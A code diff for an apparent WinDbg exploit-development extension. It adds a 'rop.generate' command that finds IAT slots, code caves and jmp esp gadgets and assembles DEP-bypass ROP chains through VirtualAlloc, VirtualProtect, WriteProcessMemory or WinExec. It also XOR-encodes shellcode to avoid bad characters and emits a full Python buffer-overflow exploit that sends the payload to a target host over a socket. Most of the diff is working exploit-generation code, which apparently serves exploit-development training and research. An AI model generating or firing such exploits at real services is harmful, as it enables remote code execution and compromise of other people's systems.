@@ -46,6 +46,7 @@ import { createCodeCavesCommand } from "./commands/code_caves";
 import { createFmtCommands } from "./commands/fmtstr";
 import { createShellcodeNamespace } from "./shellcode";
 import { buildCapabilityIndexFromRpPlusText, buildCapabilityIndexFromSequences, classifyPivotSource, emissionRows, filterCorpusByBadchars, firstKnownAddress, fixRetImmPadding, formatChainPython, formatExportPython, gadgetSequence, hex32, mergeCapabilityIndexes, normalizeExploitStrategy, planExploitStrategy, planRegisterSetup, planVirtualAlloc, planVirtualAllocFrame, planVirtualProtect, planVirtualProtectFrame, planWriteProcessMemory, planWriteProcessMemoryFrame, planRegisterSetupPacking, planWriteFrame, planSlotDispatch, type FrameWord, type SlotDispatchPlan, RankedSemanticEmitter, solveValue, strategyPlanRows, summarizeCapabilities, synthesize, synthesisRows, type ApiResolutionMode, type CapabilityIndex, type ChainTarget, type ControlMechanism, type EmissionResult, type ExploitState, type ExportableEmission, type ExportableSynthesis, type FlatFramePlan, type RegisterState, type RopQuery, type RopStrategyPlan, type SynthesisResult, type ValueRecipe, type VirtualAllocFrameParams, type VirtualAllocParams, type VirtualProtectFrameParams, type VirtualProtectParams, type WriteProcessMemoryFrameParams, type WriteProcessMemoryParams } from "./rop";
+import { buildExploitFrame } from "./rop/exploit_frame";
 import { discoverLiveGadgets, type LiveDiscoveryOptions } from "./analysis/live_gadgets";
 import { listModulesWithMitigations } from "./commands/modules";
 import { sequencesFromLiveHits } from "./semantics/live-provider";
@@ -1961,6 +1962,340 @@ function bindApi(): OsedApi {
     return toDxResult("ROP Slot Call", rows);
   };
 
+  const API_IAT_NAMES: Record<string, string> = {
+    VirtualProtect: "VirtualProtect",
+    VirtualAlloc: "VirtualAlloc",
+    WriteProcessMemory: "WriteProcessMemory",
+    VirtualProtectEx: "VirtualProtectEx",
+    VirtualAllocEx: "VirtualAllocEx",
+    WinExec: "WinExec",
+  };
+
+  const executeRopGenerate = (...args: unknown[]): DxResult => {
+    if (args.length === 1 && args[0] === "help") {
+      return helperHelp("rop.generate");
+    }
+
+    if (!currentRopCorpus) {
+      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+      renderRows("Exploit Builder", rows);
+      return toDxResult("Exploit Builder", rows);
+    }
+    const exploitStale = staleCorpusGuard("Exploit Builder", "rop.generate");
+    if (exploitStale) return exploitStale;
+
+    const options = isPlainObject(args[0])
+      ? args[0]
+      : { api: args[0], shellcode: args[1], badchars: args[2] };
+
+    const strategyName = normalizeExploitStrategy(String(options.api ?? "VirtualAlloc"));
+    if (
+      !strategyName ||
+      strategyName === "Stack Pivot" ||
+      strategyName === "LoadLibraryA" ||
+      strategyName === "GetProcAddress"
+    ) {
+      const rows = [{
+        Error: "rop.generate supports VirtualProtect, VirtualAlloc, WriteProcessMemory, WinExec, and Ex variants. Got: " + String(options.api ?? "(none)"),
+      }];
+      renderRows("Exploit Builder", rows);
+      return toDxResult("Exploit Builder", rows);
+    }
+
+    const shellcodeHex = String(options.shellcode ?? "");
+    const badchars = parseBadcharsOption(options.badchars);
+    const entrySkew = Number(options.entrySkew ?? 0);
+    const pythonLines: string[] = [];
+    const allWarnings: string[] = [];
+    const allErrors: string[] = [];
+
+    out.section(`Exploit Builder — ${strategyName}`);
+
+    // --- Step 1: Resolve IAT slot ---
+    let iatSlotAddr: number | undefined;
+    if (options.iatSlot !== undefined) {
+      iatSlotAddr = Number(options.iatSlot) >>> 0;
+      out.info(`IAT slot: ${hex32(iatSlotAddr)} (user-supplied)`);
+    } else {
+      const iatName = API_IAT_NAMES[strategyName];
+      if (iatName) {
+        try {
+          const scNs = api.sc as Record<string, (...a: unknown[]) => unknown> | undefined;
+          if (scNs && typeof scNs.iat_find === "function") {
+            const iatResult = scNs.iat_find(iatName);
+            if (lastResult && lastResult.success && lastResult.findings.length > 0) {
+              const firstRow = lastResult.findings[0] as Record<string, unknown>;
+              const slotStr = String(firstRow.Slot ?? firstRow.slot ?? "");
+              const match = /0x([0-9a-fA-F]+)/.exec(slotStr);
+              if (match) {
+                iatSlotAddr = parseInt(match[1], 16) >>> 0;
+                out.info(`IAT slot: ${hex32(iatSlotAddr)} (auto-discovered for ${iatName})`);
+              }
+            }
+          }
+        } catch { /* fall through to placeholder */ }
+      }
+      if (iatSlotAddr === undefined) {
+        allWarnings.push(`Could not auto-discover IAT slot for ${strategyName}. Pass iatSlot manually, or run: dx @$osed().sc.iat_find("${strategyName}")`);
+        out.warn(`IAT slot not found — use iatSlot parameter or run sc.iat_find("${strategyName}")`);
+      }
+    }
+
+    // --- Step 2: Resolve writable buffer address ---
+    let bufAddr: string | undefined;
+    if (options.buf !== undefined) {
+      bufAddr = String(options.buf).trim();
+      out.info(`Buffer: ${bufAddr} (user-supplied)`);
+    } else {
+      try {
+        const cavesResult = registry.execute("code_caves", {
+          module: options.module,
+          minSize: 0x200,
+          maxResults: 5,
+        });
+        if (cavesResult.success && cavesResult.findings.length > 0) {
+          const cave = cavesResult.findings[0] as Record<string, unknown>;
+          const caveAddr = String(cave.address ?? "");
+          const addrMatch = /0x([0-9a-fA-F]+)/i.exec(caveAddr);
+          if (addrMatch) {
+            bufAddr = `0x${addrMatch[1]}`;
+            const caveSize = cave.size ?? "?";
+            out.info(`Buffer: ${bufAddr} (code cave, ${caveSize} bytes, module: ${cave.module ?? "?"})`);
+          }
+        }
+      } catch { /* fall through */ }
+      if (!bufAddr) {
+        allWarnings.push("Could not auto-discover writable buffer. Pass buf address, or run: dx @$osed().code_caves(module)");
+        out.warn("Writable buffer not found — use buf parameter or run code_caves()");
+        bufAddr = "BUF";
+      }
+    }
+
+    // --- Step 3: Find return gadget ---
+    let retGadgetAddr: bigint | undefined;
+    let retGadgetSeq = "";
+    const jmpEspCandidates = currentRopCorpus.query({
+      capability: "DISPATCH_JMP_REGISTER",
+      executableOnly: true,
+    });
+    const jmpEsp = jmpEspCandidates.find((g) => {
+      const cap = g.capabilities.find((c) => c.kind === "DISPATCH_JMP_REGISTER");
+      return cap && cap.register === "esp";
+    });
+    if (jmpEsp) {
+      retGadgetAddr = firstKnownAddress(jmpEsp);
+      retGadgetSeq = jmpEsp.instructions.map((i) => i.normalizedText || i.originalText).join(" ; ");
+    }
+
+    let retAddrWord: FrameWord;
+    if (options.retAddr !== undefined) {
+      const ra = String(options.retAddr).trim();
+      if (/^(0x)?[0-9a-fA-F]+$/.test(ra)) {
+        retAddrWord = { value: parseInt(ra.replace(/^0x/i, ""), 16) >>> 0, comment: "return address (user-supplied)" };
+      } else {
+        retAddrWord = { placeholder: ra.toUpperCase(), comment: "return address (user-supplied placeholder)" };
+      }
+    } else if (retGadgetAddr !== undefined) {
+      retAddrWord = { value: Number(retGadgetAddr), comment: `return via: ${retGadgetSeq}` };
+      out.info(`Return gadget: ${hex32(retGadgetAddr)} — ${retGadgetSeq}`);
+    } else {
+      retAddrWord = { placeholder: "RETADDR", comment: "return address — find jmp esp or similar" };
+      allWarnings.push("No jmp esp gadget found for post-call return. Supply retAddr or find one with: rop.query({capability: 'DISPATCH_JMP_REGISTER'})");
+      out.warn("No jmp esp found — supply retAddr or query the corpus");
+    }
+
+    // --- Step 4: Find writable address for out-params ---
+    let writableWord: FrameWord;
+    if (options.writable !== undefined) {
+      writableWord = { value: Number(options.writable) >>> 0, comment: "writable dword (out-param sink)" };
+    } else {
+      const bufParsed = /^0x([0-9a-fA-F]+)$/i.exec(bufAddr);
+      if (bufParsed) {
+        writableWord = { value: (parseInt(bufParsed[1], 16) + 0x100) >>> 0, comment: "writable dword (BUF+0x100, out-param sink)" };
+      } else {
+        writableWord = { placeholder: "WRITABLE", comment: "any writable dword for out-param" };
+      }
+    }
+
+    // --- Step 5: Build the frame ---
+    const frame = buildExploitFrame(strategyName, retAddrWord, writableWord);
+    const frameSpec = frame
+      .map((w) => {
+        if (w.derefSlot !== undefined) return `[${hex32(w.derefSlot)}]`;
+        if (w.placeholder) return w.placeholder;
+        return hex32(w.value!);
+      })
+      .join(" ");
+
+    // --- Step 6: Build slot_call chain ---
+    let chainPlan: SlotDispatchPlan | undefined;
+    if (iatSlotAddr !== undefined) {
+      chainPlan = planSlotDispatch(
+        currentRopCorpus,
+        /^0x[0-9a-fA-F]+$/i.test(bufAddr)
+          ? { value: parseInt(bufAddr.replace(/^0x/i, ""), 16) >>> 0 }
+          : { placeholder: bufAddr.toUpperCase() },
+        iatSlotAddr,
+        frame,
+        badchars,
+        buildStableAddressPredicate(),
+        entrySkew,
+      );
+
+      if (chainPlan.success) {
+        out.info(`Chain: ${chainPlan.steps.length} steps, ${chainPlan.stackBytes} bytes`);
+        if (chainPlan.placeholders.length > 0) {
+          out.info(`Placeholders to resolve: ${chainPlan.placeholders.join(", ")}`);
+        }
+      } else {
+        for (const u of chainPlan.unsatisfied) {
+          allWarnings.push(u);
+          out.warn(u);
+        }
+      }
+    }
+
+    // --- Step 7: Encode shellcode ---
+    let encodeResult: Record<string, unknown> | undefined;
+    if (shellcodeHex.trim().length > 0) {
+      try {
+        const encResult = registry.execute("encode", {
+          shellcode: shellcodeHex,
+          exclude: badchars.length > 0 ? badchars : [0, 10, 13],
+        });
+        if (encResult.success && encResult.findings.length > 0) {
+          encodeResult = encResult.findings[0] as Record<string, unknown>;
+          out.info(`Shellcode: ${(encodeResult.totalSize as number)} bytes (key: ${encodeResult.keyHex}, stub: ${encodeResult.stubSize} bytes)`);
+        } else {
+          for (const e of encResult.errors) allErrors.push(e);
+          for (const w of encResult.warnings) allWarnings.push(w);
+        }
+      } catch (err) {
+        allWarnings.push(`Shellcode encoding failed: ${err instanceof Error ? err.message : String(err)}`);
+      }
+    }
+
+    // --- Step 8: Generate Python exploit ---
+    out.section("Python Exploit");
+    pythonLines.push("#!/usr/bin/env python3");
+    pythonLines.push(`# ${strategyName} DEP bypass exploit — generated by osed-windbg rop.generate()`);
+    pythonLines.push("import socket");
+    pythonLines.push("from struct import pack");
+    pythonLines.push("");
+    pythonLines.push("# ---- Configuration ----");
+    pythonLines.push(`target_host = "192.168.1.100"  # TODO: set target`);
+    pythonLines.push(`target_port = 9999             # TODO: set port`);
+    pythonLines.push(`total_length = 5000             # TODO: set buffer size`);
+    if (options.offset !== undefined) {
+      pythonLines.push(`offset = ${Number(options.offset)}                  # EIP offset from triage/pattern_offset`);
+    } else {
+      pythonLines.push(`offset = 0                     # TODO: set EIP offset from triage/pattern_offset`);
+    }
+    pythonLines.push("");
+
+    if (chainPlan?.success) {
+      pythonLines.push("# ---- ROP Chain ----");
+      pythonLines.push('rop = b""');
+      for (const step of chainPlan.steps) {
+        const word = step.kind === "gadget"
+          ? hex32(step.address!)
+          : step.placeholder ?? hex32(step.value!);
+        pythonLines.push(`rop += pack("<I", ${word})  # ${step.comment}`);
+      }
+      pythonLines.push("");
+    } else {
+      pythonLines.push("# ---- ROP Chain (could not auto-build — see warnings) ----");
+      pythonLines.push('rop = b""');
+      pythonLines.push(`# TODO: Build chain manually with rop.slot_call("${bufAddr}", "${iatSlotAddr !== undefined ? hex32(iatSlotAddr) : "IAT_SLOT"}", "${frameSpec}", "${badchars.map((b) => b.toString(16).padStart(2, "0")).join(" ")}")`);
+      pythonLines.push("");
+    }
+
+    if (encodeResult) {
+      const combined = encodeResult.combined as number[];
+      const pyBytes = combined.map((b: number) => `\\x${(b & 0xff).toString(16).padStart(2, "0")}`).join("");
+      pythonLines.push("# ---- Encoded Shellcode ----");
+      pythonLines.push(`# XOR key: ${encodeResult.keyHex}, stub: ${encodeResult.stubSize} bytes, payload: ${encodeResult.encodedSize} bytes`);
+      const CHUNK = 60;
+      const fullStr = `b"${pyBytes}"`;
+      if (fullStr.length <= 100) {
+        pythonLines.push(`shellcode = ${fullStr}`);
+      } else {
+        pythonLines.push('shellcode = b""');
+        for (let i = 0; i < combined.length; i += CHUNK) {
+          const chunk = combined.slice(i, i + CHUNK);
+          const chunkStr = chunk.map((b: number) => `\\x${(b & 0xff).toString(16).padStart(2, "0")}`).join("");
+          pythonLines.push(`shellcode += b"${chunkStr}"`);
+        }
+      }
+      pythonLines.push("");
+    } else if (shellcodeHex.trim().length > 0) {
+      pythonLines.push("# ---- Shellcode (encoding failed — see warnings) ----");
+      pythonLines.push(`shellcode = b""  # TODO: encode manually with encode("${shellcodeHex.slice(0, 20)}...", badchars)`);
+      pythonLines.push("");
+    } else {
+      pythonLines.push("# ---- Shellcode ----");
+      pythonLines.push('shellcode = b""  # TODO: paste msfvenom output or use encode()');
+      pythonLines.push("");
+    }
+
+    pythonLines.push("# ---- NOP sled (optional) ----");
+    pythonLines.push("nops = b\"\\x90\" * 16");
+    pythonLines.push("");
+    pythonLines.push("# ---- Assemble payload ----");
+    pythonLines.push('padding = b"A" * offset');
+    pythonLines.push("# The EIP overwrite: first gadget of the ROP chain");
+    if (chainPlan?.success && chainPlan.steps.length > 0) {
+      const eipStep = chainPlan.steps[0];
+      const eipWord = eipStep.kind === "gadget" ? hex32(eipStep.address!) : eipStep.placeholder ?? hex32(eipStep.value!);
+      pythonLines.push(`eip = pack("<I", ${eipWord})  # ${eipStep.comment}`);
+      pythonLines.push("# rop[4:] is the rest of the chain (eip already consumed the first dword)");
+      pythonLines.push("chain_body = rop[4:]");
+    } else {
+      pythonLines.push('eip = pack("<I", 0x41414141)  # TODO: first gadget address');
+      pythonLines.push("chain_body = rop");
+    }
+    pythonLines.push("");
+    pythonLines.push("payload = padding + eip + chain_body + nops + shellcode");
+    pythonLines.push('payload += b"C" * (total_length - len(payload))');
+    pythonLines.push("");
+    pythonLines.push("# ---- Send ----");
+    pythonLines.push("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)");
+    pythonLines.push("s.connect((target_host, target_port))");
+    pythonLines.push("# s.recv(1024)  # banner");
+    pythonLines.push("s.send(payload)");
+    pythonLines.push("s.close()");
+    pythonLines.push(`print(f"[*] Sent {len(payload)} bytes to {target_host}:{target_port}")`);
+
+    for (const line of pythonLines) {
+      out.print(line);
+    }
+
+    // --- Warnings and summary ---
+    for (const w of allWarnings) out.warn(w);
+    for (const e of allErrors) out.error(e);
+
+    const rows: Array<Record<string, string>> = [
+      {
+        API: strategyName,
+        "IAT Slot": iatSlotAddr !== undefined ? hex32(iatSlotAddr) : "not found",
+        Buffer: bufAddr,
+        Chain: chainPlan?.success ? `${chainPlan.steps.length} steps` : "incomplete",
+        Shellcode: encodeResult ? `${encodeResult.totalSize} bytes` : "none",
+        Return: retGadgetAddr !== undefined ? hex32(retGadgetAddr) : "placeholder",
+      },
+    ];
+    renderRows("Exploit Builder", rows);
+    setResult({
+      command: "rop.generate",
+      args: options,
+      success: (chainPlan?.success ?? false) && allErrors.length === 0,
+      findings: [{ python: pythonLines, chain: chainPlan, encode: encodeResult }],
+      warnings: allWarnings,
+      errors: allErrors,
+    });
+    return toDxResult("Exploit Builder", rows);
+  };
+
   for (const command of registry.getAll()) {
     api[command.name] = (...args: unknown[]) => {
       return invoke(command.name, args);
@@ -1994,6 +2329,7 @@ function bindApi(): OsedApi {
     frame_va: executeRopFrameVa,
     frame_write: executeRopFrameWrite,
     slot_call: executeRopSlotCall,
+    generate: executeRopGenerate,
   };
   api.rop_find = (...args: unknown[]) => invoke("rop", args);
 
